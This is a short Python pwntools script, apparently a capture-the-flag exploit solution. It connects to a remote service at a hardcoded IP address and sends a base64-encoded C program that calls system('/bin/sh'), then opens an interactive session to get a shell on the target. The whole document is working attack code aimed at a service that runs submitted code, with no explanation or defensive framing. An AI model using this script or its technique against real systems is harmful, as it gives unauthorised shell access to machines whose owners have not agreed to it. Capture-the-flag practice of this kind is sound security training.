#!/usr/bin/python3
from pwn import *
import base64
context.log_level='debug'
context.arch='amd64'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./pwn')

ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
# gdb.attach(p)

p=remote("54.180.128.137",1234)

func = """
void a()
{
    system("/bin/sh");
}
int main()
{
    a();
}
"""

func_b64 = base64.b64encode(func.encode())

sla(b"> ", func_b64)

p.interactive()
